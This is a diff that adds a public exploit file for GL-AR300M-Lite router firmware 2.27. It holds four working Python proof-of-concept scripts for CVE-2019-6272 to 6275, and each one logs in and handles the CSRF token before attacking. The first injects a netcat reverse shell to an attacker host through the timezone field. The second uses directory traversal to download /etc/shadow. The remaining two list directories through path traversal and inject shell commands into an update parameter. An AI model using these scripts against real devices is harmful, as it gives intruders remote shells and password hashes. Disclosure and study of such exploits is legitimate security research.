@@ -1,0 +1,76 @@
+# Exploit Title: GL-AR300M-Lite Authenticated Command injection - Arbitrary file download - Directory Traversal
+# Date: 15/1/2019
+# Exploit Author: Pasquale Turi aka boombyte
+# Vendor Homepage: https://www.gl-inet.com/
+# Software Link: https://www.gl-inet.com/products/gl-ar300m/
+# Version: Firmware version 2.27
+# CVE : CVE-2019-6272 - CVE-2019-6273 - CVE-2019-6274 - CVE-2019-6275
+
+
+#CVE-2019-6272 PoC (Command injection):
+
+import requests
+
+rhost='RHOST'
+lhost='LHOST' 
+lport ='LPORT'
+password='PASSWORD'
+r=requests.get('http://'+rhost+'/login.html')
+cookie=r.cookies
+r2=requests.get('http://'+rhost+'/cgi-bin/login_cgi?action=checklogin',cookies=cookie)
+header={'X-CSRF-TOKEN':r2.text[13:45]}
+r3=requests.post('http://'+rhost+'/cgi-bin/login_cgi',headers=header,cookies=r2.cookies,data={'action':'login','password':password,'code':''})
+header={'X-CSRF-TOKEN':r3.text[31:63]}
+r4=requests.post('http://'+rhost+'/cgi-bin/login_cgi',headers=header,cookies=r3.cookies,data={'action':'settimezone','timezone':'`nc '+lhost+' '+lport+' -e /bin/ash`'})
+
+
+#CVE-2019-6273 (Arbitrary file download) PoC:
+
+import requests
+
+rhost='RHOST'
+password='PASSWORD'
+file_path='/etc/shadow'
+r=requests.get('http://'+rhost+'/login.html')
+cookie=r.cookies
+r2=requests.get('http://'+rhost+'/cgi-bin/login_cgi?action=checklogin',cookies=cookie)
+header={'X-CSRF-TOKEN':r2.text[13:45]}
+r3=requests.post('http://'+rhost+'/cgi-bin/login_cgi',headers=header,cookies=r2.cookies,data={'action':'login','password':password,'code':''})
+header={'X-CSRF-TOKEN':r3.text[31:63]}
+r4=requests.get('http://'+rhost+'/cgi-bin/download_file?/mnt/..'+file_path,headers=header,cookies=r3.cookies)
+print r4.text
+
+
+#CVE-2019-6274 (Path Trasversal) PoC:
+
+import requests
+
+rhost='RHOST'
+password='PASSWORD'
+path='/'
+r=requests.get('http://'+rhost+'/login.html')
+cookie=r.cookies
+r2=requests.get('http://'+rhost+'/cgi-bin/login_cgi?action=checklogin',cookies=cookie)
+header={'X-CSRF-TOKEN':r2.text[13:45]}
+r3=requests.post('http://'+rhost+'/cgi-bin/login_cgi',headers=header,cookies=r2.cookies,data={'action':'login','password':password,'code':''})
+header={'X-CSRF-TOKEN':r3.text[31:63]}
+r4=requests.get('http://'+rhost+'/cgi-bin/storage_cgi?id=2&pwd='+path,headers=header,cookies=r3.cookies)
+print r4.text
+
+
+#CVE-2019-6275 (Another command injection):
+
+import requests
+
+rhost='RHOST'
+lhost='LHOST' 
+lport ='LPORT'
+password='PASSWORD'
+r=requests.get('http://'+rhost+'/login.html')
+cookie=r.cookies
+r2=requests.get('http://'+rhost+'/cgi-bin/login_cgi?action=checklogin',cookies=cookie)
+header={'X-CSRF-TOKEN':r2.text[13:45]}
+r3=requests.post('http://'+rhost+'/cgi-bin/login_cgi',headers=header,cookies=r2.cookies,data={'action':'login','password':password,'code':''})
+header={'X-CSRF-TOKEN':r3.text[31:63]}
+r4=requests.post('http://'+rhost+'/cgi-bin/firmware_cgi?action=setautoupdate&auto_update=off&update_time=04%3a00%7cecho%20qydre8t159%201%7c%7ca%20%23\'%20%7cecho%20%20%60id%60%7c%7ca%20%23%7c%22%20%7cecho%20a%201%7c%7ca%20%23&_=1547223055153 ',headers=header,cookies=r3.cookies,)
+print r4.text
